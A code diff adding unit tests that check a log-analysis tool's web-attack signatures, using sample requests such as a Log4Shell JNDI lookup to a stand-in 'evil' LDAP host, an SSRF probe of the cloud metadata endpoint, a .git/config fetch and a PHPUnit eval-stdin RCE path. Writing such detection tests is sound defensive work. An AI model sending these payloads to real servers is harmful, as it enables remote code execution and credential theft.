@@ -202,6 +202,38 @@ class WeblogTests(_CaseTestBase):
         self.assertIn("Web attack: SQL injection (UNION SELECT)", titles)
 
 
+class NewWebAttackTests(_CaseTestBase):
+    """The expanded exploitation / disclosure / SSRF web signatures fire, and a couple
+    of benign near-misses stay quiet."""
+
+    def _web_titles(self, request, ua="Mozilla/5.0"):
+        def seed(s):
+            cases.add_event(
+                s, timestamp=None, host="web", source="access.log", category="weblog",
+                entity="203.0.113.9", severity="info", summary="web request",
+                raw={"client_ip": "203.0.113.9", "request": request, "status": "200",
+                     "user_agent": ua},
+            )
+        return [t for t, _ in self._run(seed)]
+
+    def test_new_exploit_signatures_fire(self) -> None:
+        cases_map = {
+            "GET /?x=${jndi:ldap://evil/a} HTTP/1.1": "Log4Shell JNDI injection (${jndi:})",
+            "GET /latest/meta-data/ HTTP/1.1 Host: 169.254.169.254": "SSRF to cloud metadata endpoint",
+            "GET /.git/config HTTP/1.1": "Exposed .git repository access",
+            "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1": "PHPUnit eval-stdin RCE (CVE-2017-9841)",
+        }
+        for request, desc in cases_map.items():
+            titles = self._web_titles(request)
+            self.assertIn(f"Web attack: {desc}", titles, request)
+
+    def test_benign_paths_do_not_fire_new_rules(self) -> None:
+        for benign in ("GET /.github/workflows/ci.yml HTTP/1.1",
+                       "GET /environment/status HTTP/1.1"):
+            titles = [t for t in self._web_titles(benign) if t.startswith("Web attack")]
+            self.assertEqual(titles, [], benign)
+
+
 class LolbinSeverityTests(_CaseTestBase):
     def _proc(self, s, name, cmdline):
         s.add(Process(
